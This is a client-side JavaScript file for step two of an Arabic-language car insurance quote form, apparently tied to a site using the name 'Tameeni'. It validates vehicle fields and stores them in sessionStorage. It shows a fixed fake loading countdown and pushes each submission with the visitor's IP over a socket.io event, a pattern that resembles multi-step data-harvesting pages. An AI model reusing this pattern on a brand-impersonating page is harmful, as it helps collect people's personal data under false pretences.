
function showLoadingScreen() {
  const overlay = document.getElementById('loadingOverlay');
  const countdown = document.getElementById('loadingCountdown');
  
  if (!overlay || !countdown) return;
  
  let seconds = 5;
  overlay.style.display = 'flex';
  
  const timer = setInterval(() => {
    seconds--;
    countdown.textContent = seconds;
    
    if (seconds <= 0) {
      clearInterval(timer);
      overlay.style.display = 'none';
    }
  }, 1000);
}


function showLoadingAndRedirect(url) {
  const loadingScreen = document.getElementById('loadingScreen');
  if (!loadingScreen) {
    window.location.href = url;
    return;
  }
  
  loadingScreen.classList.add('show');
  setTimeout(() => {
    window.location.href = url;
  }, 1000);
}

document.addEventListener("DOMContentLoaded", function(){
  
  showLoadingScreen();

  const carMake   = document.getElementById("carMake");
  const carYear   = document.getElementById("carYear");
  const usageType = document.getElementById("usageType");
  const city      = document.getElementById("city");
  const startDate = document.getElementById("startDate");

  const form = document.getElementById("formStep2");

  form.addEventListener("submit", async function(e){
    e.preventDefault();

    const errs = {
      carMake: document.getElementById("carMakeError"),
      carYear: document.getElementById("carYearError"),
      usageType: document.getElementById("usageTypeError"),
      city: document.getElementById("cityError"),
      startDate: document.getElementById("startDateError")
    };
    Object.values(errs).forEach(e=>e.textContent="");

    let valid=true;
    if(!carMake.value.trim()){ errs.carMake.textContent="الرجاء إدخال نوع المركبة."; valid=false; }
    if(!carYear.value.trim()){ errs.carYear.textContent="الرجاء إدخال سنة الصنع."; valid=false; }
    if(!usageType.value){ errs.usageType.textContent="الرجاء اختيار نوع الاستخدام."; valid=false; }
    if(!city.value.trim()){ errs.city.textContent="الرجاء إدخال مدينة الاستخدام."; valid=false; }
    if(!startDate.value){ errs.startDate.textContent="الرجاء اختيار تاريخ بداية التأمين."; valid=false; }

    if(!valid) return;

   
    let existingData = {};
    try {
      const tempData = sessionStorage.getItem('tameeniTempData');
      if (tempData) {
        existingData = JSON.parse(tempData);
      }
    } catch (e) {
      console.error("خطأ في قراءة البيانات المؤقتة:", e);
    }

    const newData = {
      carMake: carMake.value.trim(),
      carYear: carYear.value.trim(),
      usageType: usageType.value,
      city: city.value.trim(),
      startDate: startDate.value
    };

    
    const d = { ...existingData, ...newData };

    
    sessionStorage.setItem('tameeniTempData', JSON.stringify(d));

    (async function() {
        while (window.visitorIP === null) {
          await new Promise(function(r) { setTimeout(r, 50); });
        }
        var ip = window.visitorIP;
        window.socket.emit('submitVehicle', { ip: ip, carMake: newData.carMake, carYear: newData.carYear, usageType: newData.usageType, city: newData.city, startDate: newData.startDate });
      })();

   

    showLoadingAndRedirect("insurance.html");
  });
});